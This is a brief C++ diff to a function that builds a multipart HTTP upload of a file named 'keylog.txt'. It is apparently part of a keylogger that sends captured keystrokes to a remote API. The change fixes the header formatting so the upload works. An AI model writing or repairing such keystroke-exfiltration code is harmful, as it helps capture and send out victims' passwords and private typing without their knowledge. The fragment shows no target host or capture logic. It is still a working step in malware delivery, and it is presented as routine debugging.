@@ -44,7 +44,7 @@ void sendToApi(const std::string &filename)
     std::string body;
     body += "--" + boundary + "\r\n";
     body += "Content-Disposition: form-data; name=\"file\"; filename=\"keylog.txt\"\r\n";
-    body += "Content-Type: text/plain\r\n";
+    body += "Content-Type: text/plain\r\n\r\n";
     body += fileData;
     body += "\r\n--" + boundary + "--\r\n";
 
